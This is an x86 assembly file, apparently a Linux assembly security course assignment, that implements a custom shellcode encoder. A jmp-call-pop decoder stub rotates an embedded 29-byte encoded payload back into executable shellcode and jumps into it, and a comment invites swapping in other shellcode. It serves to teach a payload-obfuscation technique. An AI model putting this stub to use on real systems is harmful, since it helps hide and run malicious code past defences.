;#SLAE Assignment #04: Custom Encoder
;#AUTHOR: SLAE-1262
;#Change shellcode and length down at marked location

global _start

section .text
_start:
	;### Decrement-Rotate-Decoder ###

	jmp short call_decoder	;jmp-call-pop method

decoder:
	pop esi			;esi now contains address off shellcode
	xor ecx,ecx
	mov cl,29		;Shellcode length (=counter for loop) <== CHANGEME
	
decode:
	rol byte [esi],cl
	inc esi
	loop decode
	jmp short shellcode	;pass execution to shellcode

call_decoder:
	call decoder
	shellcode: db 0x89,0x0c,0x16,0xc2,0xdd,0xff,0xff,0xff,0x08,0x18,0x7c,0xcb,0xb9,0x68,0x04,0x4d,0x43,0xf2,0x4c,0x5a,0x37,0x89,0xc7,0xc4,0x4e,0x13,0x5a,0x73,0x40
